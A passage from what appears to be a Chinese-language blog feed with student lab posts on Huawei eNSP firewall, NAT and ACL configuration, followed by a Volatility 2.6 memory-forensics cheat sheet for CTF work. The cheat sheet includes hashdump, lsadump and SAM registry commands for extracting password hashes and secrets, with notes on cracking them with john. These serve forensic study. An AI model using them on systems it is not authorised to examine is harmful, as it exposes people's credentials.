class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[FW2]int g1/0/0</span><br><span class="line">[FW2-GigabitEthernet1/0/0]service-manage enable </span><br><span class="line">[FW2-GigabitEthernet1/0/0]service-manage ping permit </span><br><span class="line">[FW2-GigabitEthernet1/0/0]quit</span><br><span class="line">[FW2]int g1/0/1</span><br><span class="line">[FW2-GigabitEthernet1/0/1]service-manage enable </span><br><span class="line">[FW2-GigabitEthernet1/0/1]service-manage ping permit</span><br><span class="line">[FW2-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure><p>3.然后配置安全区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FW1]firewall zone trust </span><br><span class="line">[FW1-zone-trust]add interface g1/0/0</span><br><span class="line">[FW1-zone-trust]quit</span><br><span class="line">[FW1]firewall zone untrust </span><br><span class="line">[FW1-zone-untrust]add interface g1/0/1</span><br><span class="line">[FW1-zone-untrust]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FW2]firewall zone trust </span><br><span class="line">[FW2-zone-trust]add interface g1/0/0</span><br><span class="line">[FW2-zone-trust]quit</span><br><span class="line">[FW2]firewall zone untrust </span><br><span class="line">[FW2-zone-untrust]add interface g1/0/1</span><br><span class="line">[FW2-zone-untrust]quit</span><br></pre></td></tr></table></figure><p>4.然后配置安全策略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[FW1]security-policy</span><br><span class="line">[FW1-policy-security]rule name 1</span><br><span class="line">[FW1-policy-security-rule-1]source-address 10.18.1.1 mask 255.255.255.0</span><br><span class="line">[FW1-policy-security-rule-1]destination-address 10.18.2.1 mask 255.255.255.0</span><br><span class="line">[FW1-policy-security-rule-1]service icmp</span><br><span class="line">[FW1-policy-security-rule-1]action permit </span><br><span class="line">[FW1-policy-security-rule-1]quit</span><br><span class="line">[FW1-policy-security]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[FW2]security-policy</span><br><span class="line">[FW2-policy-security]rule name 1</span><br><span class="line">[FW2-policy-security-rule-1]source-address 10.18.1.1 mask 255.255.255.0</span><br><span class="line">[FW2-policy-security-rule-1]destination-address 10.18.2.1 mask 255.255.255.0</span><br><span class="line">[FW2-policy-security-rule-1]service icmp</span><br><span class="line">[FW2-policy-security-rule-1]action permit</span><br><span class="line">[FW2-policy-security-rule-1]quit</span><br><span class="line">[FW2-policy-security]quit</span><br></pre></td></tr></table></figure><p>5.最后开始配置ospf，保证网络的连通</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[AR1]ospf 1</span><br><span class="line">[AR1-ospf-1]area 0</span><br><span class="line">[AR1-ospf-1-area-0.0.0.0]network 10.18.11.0 0.0.0.255</span><br><span class="line">[AR1-ospf-1-area-0.0.0.0]network 10.18.12.0 0.0.0.255</span><br><span class="line">[AR1-ospf-1-area-0.0.0.0]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[FW1]ospf 1</span><br><span class="line">[FW1-ospf-1]area 0</span><br><span class="line">[FW1-ospf-1-area-0.0.0.0]network 10.18.11.0 0.0.0.255</span><br><span class="line">[FW1-ospf-1-area-0.0.0.0]quit</span><br><span class="line">[FW1-ospf-1]area 1</span><br><span class="line">[FW1-ospf-1-area-0.0.0.1]network 10.18.1.0 0.0.0.255</span><br><span class="line">[FW1-ospf-1-area-0.0.0.1]quit</span><br><span class="line">[FW1-ospf-1]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[FW2]ospf 1</span><br><span class="line">[FW2-ospf-1]area 0</span><br><span class="line">[FW2-ospf-1-area-0.0.0.0]network 10.18.12.0 0.0.0.255</span><br><span class="line">[FW2-ospf-1-area-0.0.0.0]quit</span><br><span class="line">[FW2-ospf-1]area 1</span><br><span class="line">[FW2-ospf-1-area-0.0.0.1]network 10.18.2.0 0.0.0.255</span><br><span class="line">[FW2-ospf-1-area-0.0.0.1]quit</span><br><span class="line">[FW2-ospf-1]quit</span><br></pre></td></tr></table></figure><p>然后进行测试，结果为pc1可以ping通pc2，但是pc2无法ping通pc1</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网基实践题-防火墙配置&quot;&gt;&lt;a href=&quot;#网基实践题-防火墙配置&quot; class=&quot;headerlink&quot; title=&quot;网基实践题-防火墙配置&quot;&gt;&lt;/a&gt;网基实践题-防火墙配置&lt;/h1&gt;&lt;h2 id=&quot;实验拓扑图一：&quot;&gt;&lt;a href=&quot;#实验拓扑图一：&quot; c</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>网基实践题-NAT</title>
    <link href="https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/"/>
    <id>https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/</id>
    <published>2024-04-09T14:56:26.651Z</published>
    <updated>2024-06-11T08:00:03.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网基实践题-NAT"><a href="#网基实践题-NAT" class="headerlink" title="网基实践题-NAT"></a>网基实践题-NAT</h1><p><a href="https://so.csdn.net/so/search?q=ensp&spm=1001.2101.3001.7020">ensp</a>中NAT种类的分类</p><table><thead><tr><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>static NAT （静态NAT）</td><td>一个私网地址只能够对应一个公网IP地址</td></tr><tr><td>easy IP （动态NAT）</td><td>多个私网地址对应一个公网地址</td></tr><tr><td>NAT Server</td><td>外网客户端访问内网服务器时就会用到这个</td></tr></tbody></table><p>私网IP地址的范围</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">A类地址:10.0.0.0～10.255.255.255 </span></span><br><span class="line"><span class="language-xml">B类地址:172.16.0.0 ～172.31.255.255 </span></span><br><span class="line"><span class="language-xml">C类地址:192.168.0.0～192.168.255.255</span></span><br></pre></td></tr></table></figure><h2 id="实验拓扑图："><a href="#实验拓扑图：" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h2><p><img src="/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/image-20240409215941199.png" alt="image-20240409215941199"></p><h2 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.首先按照上图将PC机以及相关的路由器各个端口进行配置</p><p>AR1配置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname AR1</span><br><span class="line">[AR1]int g0/0/0</span><br><span class="line">[AR1-GigabitEthernet0/0/0]ip address 7.7.7.7 24</span><br><span class="line">[AR1-GigabitEthernet0/0/0]quit</span><br><span class="line">[AR1]int g0/0/1</span><br><span class="line">[AR1-GigabitEthernet0/0/1]ip address 192.168.1.1 24</span><br><span class="line">[AR1-GigabitEthernet0/0/1]quit</span><br></pre></td></tr></table></figure><p>AR2配置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname AR2</span><br><span class="line">[AR2]int g0/0/0</span><br><span class="line">[AR2-GigabitEthernet0/0/0]ip address 7.7.7.1 24</span><br><span class="line">[AR2-GigabitEthernet0/0/0]int g0/0/1</span><br><span class="line">[AR2-GigabitEthernet0/0/1]ip address 8.8.8.1 24</span><br><span class="line">[AR2-GigabitEthernet0/0/1]int g0/0/2</span><br><span class="line">[AR2-GigabitEthernet0/0/2]ip address 9.9.9.1 24</span><br><span class="line">[AR2-GigabitEthernet0/0/2]quit</span><br></pre></td></tr></table></figure><p>2.然后AR1需要配置缺省路由，又叫默认路由（比较特殊的静态路由）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[AR1]ip route-static 0.0.0.0 0.0.0.0 7.7.7.1</span><br></pre></td></tr></table></figure><p>3.然后配置规则，配置nat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[AR1]acl number 2000</span><br><span class="line">[AR1-acl-basic-2000]rule 5 permit source 192.168.1.0 0.0.0.255</span><br><span class="line">[AR1-acl-basic-2000]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[AR1-GigabitEthernet0/0/0]nat server protocol tcp global current-interface 80 inside 192.168.1.200 80#这个配置的是NAT Server，将内网服务器192.168.1.200的80端口映射到当前端口公有地址7.7.7.7的80端口</span><br><span class="line">[AR1-GigabitEthernet0/0/0]nat static global 7.7.7.0 inside 192.168.1.0#这一行命令和上面的二选一就行，这个是配置静态NAT的，还需要命令nat static enable</span><br><span class="line">[AR1-GigabitEthernet0/0/0]nat outbound 2000</span><br></pre></td></tr></table></figure><p>然后就可以发现内网的pc1和pc2是可以ping通外网的外网的却无法ping内网</p><p>具体命令解析：</p><p><code>nat static global 7.7.7.2 inside 192.168.1.100 </code>     将内网IP地址为192.168.1.100的主机访问外网时，交给公网IP地址7.7.7.2去处理（注：这个公网IP地址是自己指定的）</p><p><code>nat server protocol tcp global current-interface 80 inside 192.168.1.200 80</code> 的具体解析如下：</p><p>protocol tcp: 这表示NAT服务器将使用TCP协议进行流量转发。</p><ul><li>global current-interface 80: 这部分配置定义了全局地址和端口号。<ul><li>global: 表示这是一个全局地址，即用于外部网络访问的地址。</li><li>current-interface: 表示使用当前接口（通常是连接到外部网络的接口）的IP地址作为全局地址。这通常用于动态获取接口的公网IP地址。</li><li>80: 这是外部网络访问内部服务器时所使用的端口号。在这里，它设置为HTTP服务的标准端口号80。</li></ul></li><li>inside 192.168.1.200 80: 这部分配置定义了内部服务器的地址和端口号。<ul><li>inside: 表示这是一个内部地址，即内部网络中服务器的地址。</li><li>192.168.1.200: 这是内部服务器的IP地址。</li><li>80: 这是内部服务器上运行的服务所监听的端口号。在这里，它同样设置为80，表示内部服务器正在监听HTTP服务。</li></ul></li></ul><p>综上所述，这条命令的作用是配置一个NAT服务器映射，使得外部网络可以通过当前接口的公网IP地址的80端口访问内部网络中IP地址为192.168.1.200的服务器的80端口（通常是HTTP服务）。</p><p>在配置NAT服务器之前，请确保：</p><ol><li>内部服务器已经启动并且服务（在这里是HTTP服务）正在监听指定的端口。</li><li>设备的外部接口已经配置并获得了有效的公网IP地址。</li><li>设备的路由配置允许外部流量到达NAT服务器映射。</li><li>防火墙规则允许相关的TCP流量通过。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网基实践题-NAT&quot;&gt;&lt;a href=&quot;#网基实践题-NAT&quot; class=&quot;headerlink&quot; title=&quot;网基实践题-NAT&quot;&gt;&lt;/a&gt;网基实践题-NAT&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=e</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>网基实践题-ACL</title>
    <link href="https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/"/>
    <id>https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/</id>
    <published>2024-04-09T13:47:03.460Z</published>
    <updated>2024-04-09T14:57:51.217Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ACL的分类</strong></p><table><thead><tr><th>基本ACL（2000-2999）</th><th>根据源地址来进行访问控制</th></tr></thead><tbody><tr><td>高级ACL（3000-3999）</td><td>可以根据源地址、目标地址、源端口号等来进行访问控制</td></tr></tbody></table><p>注：我们在不管在配置什么ACL的时候，需先保证全网互通，然后在根据需要来进行设置ACL访问控制</p><h1 id="网基实践题-ACL"><a href="#网基实践题-ACL" class="headerlink" title="网基实践题-ACL"></a>网基实践题-ACL</h1><h2 id="实验拓扑图："><a href="#实验拓扑图：" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h2><img src="/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409211406928.png" alt="image-20240409211406928" style="zoom: 33%;"><h2 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.首先保证PC1和PC2能够互通（具体的就不写了，基本的）</p><img src="/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409211921518.png" alt="image-20240409211921518" style="zoom:50%;"><p>2.配置访问控制列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[AR1]acl number 2000 [match-order auto|config] #这里我是设置的auto</span><br><span class="line">[AR1-acl-basic-2000]rule deny source 1.1.1.10 0</span><br><span class="line">[AR1-acl-basic-2000]rule permit source 1.1.1.0 0.0.0.255 #实际上这个规则是不起作用的，只是方便理解什么是‘深度优先’。上面的设置如果不是auto而是config的话，要加上id号，即rule id [deny|permit]......</span><br><span class="line">[AR1-acl-basic-2000]display this#这一步也可以忽略，这里只是列出来方便理解</span><br><span class="line">#acl number 2000  match-order auto</span><br><span class="line"># rule 5 deny source 1.1.1.10 0 </span><br><span class="line"># rule 10 permit source 1.1.1.0 0.0.0.255</span><br><span class="line">[AR1-acl-basic-2000]int g0/0/0#进入端口，引用规则</span><br><span class="line">[AR1-GigabitEthernet0/0/0]traffic-filter inbound acl 2000</span><br></pre></td></tr></table></figure><p>配置完成之后可以发现PC1的流量没法出去了</p><img src="/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409214259683.png" alt="image-20240409214259683" style="zoom:50%;"><p>具体解析：</p><p><code>match-order auto</code>：这个参数设置ACL规则的匹配顺序为自动。当设置为“自动”时，系统将按照“深度优先”的顺序自动对规则进行排序。如果“深度优先”的顺序相同，则按照rule-id由小到大的顺序进行匹配。</p><p>当您在创建ACL时指定 <code>match-order config</code>，这意味着ACL规则将按照您在配置中指定的顺序进行匹配。这意味着规则的顺序对于过滤决策至关重要，因为系统会根据规则在配置中出现的顺序来依次评估它们。</p><p>需要注意的是，如果在创建ACL时没有明确指定 <code>match-order</code> 参数，那么默认的规则匹配顺序通常是 <code>config</code></p><p>ACL的inbound和outbound有什么区别：</p><p>inbound和outbound的主要区别在于它们处理网络流量的方向不同。</p><p>Inbound（入站）是指从外部网络（例如Internet）进入本地网络中的数据流量。这种方向的ACL规则主要用于保护内部网络资源免受未经授权的访问和攻击。</p><p>Outbound（出站）则是指从本地网络向外部网络发送的数据流量。这种方向的ACL规则主要用于控制内部网络向外部发送的数据，以防止敏感信息的泄露或不合规的外部访问。</p><p>Inbound方向更侧重于保护内部网络资源，而outbound方向则更侧重于控制内部网络向外部的流量。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;ACL的分类&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;基本ACL（2000-2999）&lt;/th&gt;
&lt;th&gt;根据源地址来进行访问控制&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;高级ACL（300</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>Volatility2.6的使用方法</title>
    <link href="https://w-sqrt7.github.io/2024/03/25/tools/Volatility2.6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>https://w-sqrt7.github.io/2024/03/25/tools/Volatility2.6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2024-03-25T08:54:17.301Z</published>
    <updated>2024-03-25T09:03:50.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Volatility2-6的使用方法"><a href="#Volatility2-6的使用方法" class="headerlink" title="Volatility2.6的使用方法"></a>Volatility2.6的使用方法</h1><p>原文链接：<a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html">https://wiki.wgpsec.org/knowledge/ctf/Volatility.html</a></p><p>原文链接：<a href="https://blog.csdn.net/m0_68012373/article/details/127419463">https://blog.csdn.net/m0_68012373/article/details/127419463</a></p><h2 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f [image] --profile=[profile] [plugin]</span><br><span class="line"></span><br><span class="line">volatility -f [对象] --profile=[操作系统] [插件参数]</span><br></pre></td></tr></table></figure><p>在分析之前，需要先判断当前的镜像信息，分析出是哪个操作系统，命令imageinfo即可获取镜像信息。</p><pre><code>Volatility -f xxx.vmem imageinfo</code></pre><p>在查到操作系统后如果不确定可以使用以下命令查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility - f xxx.vmem --profile= [操作系统] volshell</span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>输入<strong>vol.py –info</strong>可查看插件</p><p>1.查看当前内存镜像中的用户printkey -K “SAM\Domains\Account\Users\Names”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem –profile=Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”</span><br></pre></td></tr></table></figure><p>2.查看用户名密码信息(密码是哈希值，需要john爆破) hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure><p>查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)</p><p>3.如果john爆破不出来，就使用 lasdmp 查看强密码 lsadmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 lsadump</span><br></pre></td></tr></table></figure><p><strong>4.查看进程pslist</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p>pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</p><p>5.查看已知进程pslist</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 pslist -p 2588</span><br></pre></td></tr></table></figure><p><strong>6.隐藏或解链的进程psscan</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 psscan</span><br></pre></td></tr></table></figure><p>psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</p><p><strong>7.查看服务，查询服务名称svcscan</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 svcscan</span><br></pre></td></tr></table></figure><p>svcscan：扫描 Windows 的服务</p><p>8.查看浏览器历史记录,获取当前系统浏览器搜索过的关键词 iehistory</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 iehistory</span><br></pre></td></tr></table></figure><p>9.查看网络连接 获取当前系统 ip netscan </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure><p>有一些版本 这个命令是使用不了 这里我们就要使用（connscan,connections)</p><p>volatility -f win7.vmem –profile&#x3D;Win7SPIx64 netscan |grep ESTABLISHED  查看网络通信连接</p><p>10.查看网络连接connscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 connscan</span><br></pre></td></tr></table></figure><p>connscan：查看网络连接</p><p>11.查看网络连接connections</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 connections</span><br></pre></td></tr></table></figure><p>connections：查看网络连接</p><p><strong>12.查看命令行操作，显示cmd历史命令 cmdscan</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p>cmdscan：可用于查看终端记录</p><p>13.查看进程命令行参数（具体一些可疑进程的参数指令）cmdline</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><p><strong>14.扫描所有的文件列表 filescan</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 filescan</span><br></pre></td></tr></table></figure><p>（linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’）</p><p>例</p><p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 filescan grep “flag.txt”</p><p>cat system.txt|grep -i computername</p><p><strong>15.查看文件内容dmpfiles</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./</span><br></pre></td></tr></table></figure><p>需要指定偏移量 -Q 和输出目录 -D</p><p>dumpfiles：导出某一文件(指定虚拟地址)</p><p>16.查看当前展示的notepad内容 notepad</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 notepad</span><br></pre></td></tr></table></figure><p>查看当前展示的 notepad 文本（–profile&#x3D;winxp啥的低版本可以，win7的不行，可以尝试使用editbox）</p><p>17.显示有关编辑控件（曾经编辑过的内容）的信息 editbox</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 editbox</span><br></pre></td></tr></table></figure><p>editbox：显示有关编辑控件（曾经编辑过的内容）的信息 查看内存中记事本的内容</p><p>18.提取进程memdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 memdump -p xxx --dump-dir=./</span><br></pre></td></tr></table></figure><p>memdump：提取出指定进程，常用foremost 来分离里面的文件  </p><p>需要指定进程-p [pid] 和输出目录 -D</p><p>memdump -p 332 -D XX&#x2F;   </p><p>提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）</p><p>dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐</p><p>strings -e l 2040.dmp | grep flag 查找flag</p><p>19.屏幕截图screenshot</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./</span><br></pre></td></tr></table></figure><p>screenshot：保存基于GDI窗口的伪截屏</p><p><strong>20.查看注册表配置单元hivelist</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure><p>hivelist: 列出所有的注册表项及其虚拟地址和物理地址</p><p>21.查看注册表键名hivedmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410</span><br></pre></td></tr></table></figure><p>22.查看注册表键值printkey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure><p>23.获取主机名 printkey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure><p>24.列出用户名 pringkey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><strong>25.查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等。userassist</strong></p><figure class="highlight 